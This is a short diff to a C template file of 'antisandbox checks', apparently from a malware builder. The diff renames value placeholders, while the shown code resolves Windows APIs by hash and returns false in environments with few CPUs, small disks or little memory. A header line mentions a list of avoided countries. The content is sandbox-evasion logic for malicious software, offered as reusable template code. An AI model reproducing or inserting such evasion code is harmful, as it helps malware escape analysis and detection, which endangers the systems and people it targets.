@@ -1,12 +1,12 @@
 // Templates for antisandbox checks
-// Placeholders: %VALUE%, AVOIDED_COUNTRIES, AVOIDED_COUNTRIES_SIZE
+// Placeholders: %__VALUE__%, AVOIDED_COUNTRIES, AVOIDED_COUNTRIES_SIZE
 
 //__CPU Check__//
 GetSystemInfoFunc pGetSystemInfo = (GetSystemInfoFunc)CustomGetProcAddress(hKernel32, GET_SYSTEM_INFO_HASH);
 SYSTEM_INFO sysInfo;
 pGetSystemInfo(&sysInfo);
 
-if (sysInfo.dwNumberOfProcessors <= %VALUE%) {
+if (sysInfo.dwNumberOfProcessors <= %__VALUE__%) {
     return false;
 }
 //__END__CPU Check__//
@@ -17,7 +17,7 @@ if (!GetDiskFreeSpaceExA(NULL, &freeBytesAvailable, &totalBytes, &totalFreeBytes
     return false;
 }
 
-if (totalBytes.QuadPart < %VALUE%) {
+if (totalBytes.QuadPart < %__VALUE__%) {
     return false;
 }
 //__END__Disk Check__//
@@ -27,7 +27,7 @@ MEMORYSTATUSEX memStatus;
 memStatus.dwLength = sizeof(memStatus);
 GlobalMemoryStatusEx(&memStatus);
 
-if (memStatus.ullTotalPhys / (1024 * 1024) < %VALUE%) {
+if (memStatus.ullTotalPhys / (1024 * 1024) < %__VALUE__%) {
     return false;
 }
 //__END__Memory Check__//
